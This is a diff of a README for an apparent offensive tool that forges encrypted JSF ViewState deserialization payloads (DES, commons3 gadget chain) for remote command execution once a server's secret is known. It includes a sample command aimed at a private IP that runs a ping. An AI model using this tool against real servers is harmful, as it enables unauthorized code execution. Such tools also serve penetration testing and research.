@@ -8,13 +8,13 @@ This tool is meant for situations when the encryption and/or HMAC secret from th
 * DES
 * (Coming soon: AES)
 
-### Payload options:
+### Payload formatting options:
 * Powershell
 * Bash
 * (Python/Perl coming soon!)
 
 ### Sample command:
-python Lord_of_Cereal.py -u "http://192.168.1.10.:8080/subscribe.faces" -e DES -s s3cr3tk3y -p commons3 -t javax.faces.ViewState -c "ping 192.168.10.8" -f powershell
+`python Lord_of_Cereal.py -u "http://192.168.1.10.:8080/subscribe.faces" -e DES -s s3cr3tk3y -p commons3 -t javax.faces.ViewState -c "ping 192.168.10.8" -f powershell`
 
 ## To do:
 * Add support for other encryption methods
